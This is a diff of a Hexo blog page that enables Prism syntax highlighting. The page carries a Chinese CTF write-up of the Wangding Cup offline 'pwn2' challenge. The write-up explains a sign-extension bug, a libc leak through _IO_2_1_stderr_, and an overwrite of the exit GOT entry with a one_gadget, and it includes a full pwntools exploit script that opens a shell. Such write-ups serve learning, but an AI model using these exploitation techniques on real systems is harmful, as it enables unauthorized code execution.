@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="网鼎杯线下赛 pwn2 wp​    师傅网鼎杯扔给我的，当时没来的及做，现在做了一下，这里贴出思路。​">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -317,9 +317,40 @@
     <div class="post-body" itemprop="articleBody">
         <h2 id="网鼎杯线下赛-pwn2-wp"><a href="#网鼎杯线下赛-pwn2-wp" class="headerlink" title="网鼎杯线下赛 pwn2 wp"></a>网鼎杯线下赛 pwn2 wp</h2><p>​    师傅网鼎杯扔给我的，当时没来的及做，现在做了一下，这里贴出思路。<br>​    <a id="more"></a><br>​    网鼎杯线下三题中这个算是最简单的了，感叹网鼎杯的赛题质量还是挺高的，听师傅说网鼎杯是借鉴的国外赛题，国外赛题的话一般是re/pwn结合的，一般并称为binary，所以看线下赛的两道堆题，不仅需要你pwn，还需要你把他逻辑逆出来。符号表被裁，函数也比较多，不再是寻常的3~4个函数的选单程序，看上去比较贴近实际。分析起来可以算是有点烦的了。其它两题有空再说，现在贴下pwn2的思路。<br>pwn2的话是一个brainfuck程序，玩法是通过输入一些程序规定的特殊字符，去使用程序指定的一些功能。记得pwnable.kr上好像是有一道类似的题目。<br>​    这道题逻辑大概是这样的，初始指针是指向bss段，我们可以通过输入&lt;、&gt;、.、,来进行指针的移动、泄露、输入等，其实还有一些其他的功能，但是事实上对利用是没有什么太大帮助的，估计是想迷惑我们23333。<br>​    这道题思路是这样的，首先通过移动bss段的指针使其指向libc中的函数，因为这题肯定是要构造系统调用的，这里其实只有一种选择，就是将bss指针移动到位处bss段上的_IO_2_1_stderr_等函数，这样可以进行泄露libc地址，但是一开始我想的是直接将指针移动到got段进行进行泄露got表，但是由于程序里有一个操作是在数组下标寻址的时候做有符号位的扩展，导致一旦用户输入了超过0x7f个字符的话程序会将0x80解析为0xffffff80，而保存用户输入的地址之后0xffffff80地址处数据为0x00，这样的话循环会退出，程序执行exit(1)指令，这里满足条件的got好像只有exit一个，但是exit是未初始化的，即未进行plt寻址和地址绑定，所以exit无法泄露libc相关地址，而其他的got函数长度超过0x7f，会导致无法进行泄露后下一步的操作。<br>泄露_IO_2_1_stderr_的地址后可以计算libc基址，之后可以得到oneGadget等的地址，这时候如果直接写exitgot为oneGadget的话程序会报错，因为程序已经一次getshell所需的输入字符数，这里程序故意不让你一次getshell，以至于如果你覆写exit为oneGadget的话只能将oneGadget从低地址开始的4字节写入，之后直接exit，而由于oneGadget的低四字节是无效地址，程序会报错。<br>​    所以这里绕了一下，不直接写exit为oneGadget，而是将exit覆写为main函数的开头，这样的话就能再进行一次输入了，由于ptr循环开始并没有初始化，所以现在ptr指向的是exit got表地址+4的位置，所以第二次输入将ptr往低地址移4字节后进行写入，现在就能写入oneGadget了。成功getShell。<br>这道题比较坑的坑点就在于movsx的带符号位扩展，不了解的话可能会花很长时间死磕。</p>
 <p>​    exp如下：</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">import time</span><br><span class="line"><span class="attribute">libc</span>=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line"></span><br><span class="line">def <span class="builtin-name">debug</span>(<span class="attribute">msg</span>=<span class="string">''</span>):</span><br><span class="line">    gdb.attach(p,<span class="string">''</span>)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line">	p.recv()</span><br><span class="line">	payload1 = <span class="string">"&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;,&gt;,&gt;,&gt;,"</span></span><br><span class="line">	p.sendline(payload1)</span><br><span class="line">	leak_addr = p.recv(8).ljust(8,<span class="string">'\x00'</span>)</span><br><span class="line">	leak_addr = u64(leak_addr)</span><br><span class="line">	base_addr = leak_addr - libc.symbols[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">	bin_sh = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="built_in">	system </span>= libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">	payload2 = p32(0x0000400847)</span><br><span class="line">	p.send(payload2)</span><br><span class="line">	payload3 = <span class="string">'&lt;&lt;&lt;&lt;&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,'</span></span><br><span class="line">	p.sendline(payload3)</span><br><span class="line">	payload4 = p64(base_addr + 0x45216)</span><br><span class="line">	p.sendline(payload4)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">		#p = remote(<span class="string">'172.16.5.'</span>+str(i),5069)	</span><br><span class="line">		<span class="attribute">p</span>=process('./pwn2')</span><br><span class="line">		exploit()</span><br></pre></td></tr></table></figure>
+<pre><code>#coding:utf-8
 
+import sys
+from pwn import *
+#from LibcSearcher import *
+import time
+libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
 
+def debug(msg=&#39;&#39;):
+    gdb.attach(p,&#39;&#39;)
+    raw_input()
+
+def exploit():
+    p.recv()
+    payload1 = &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&gt;.&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;,&gt;,&gt;,&gt;,&quot;
+    p.sendline(payload1)
+    leak_addr = p.recv(8).ljust(8,&#39;\x00&#39;)
+    leak_addr = u64(leak_addr)
+    base_addr = leak_addr - libc.symbols[&#39;_IO_2_1_stderr_&#39;]
+    bin_sh = next(libc.search(&#39;/bin/sh&#39;))
+    system = libc.symbols[&#39;system&#39;]
+    payload2 = p32(0x0000400847)
+    p.send(payload2)
+    payload3 = &#39;&lt;&lt;&lt;&lt;&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&gt;,&#39;
+    p.sendline(payload3)
+    payload4 = p64(base_addr + 0x45216)
+    p.sendline(payload4)
+    p.interactive()
+
+if __name__ == &#39;__main__&#39;:
+        #p = remote(&#39;172.16.5.&#39;+str(i),5069)    
+        p=process(&#39;./pwn2&#39;)
+        exploit()
+</code></pre>
     </div>
 
     
@@ -424,6 +455,8 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
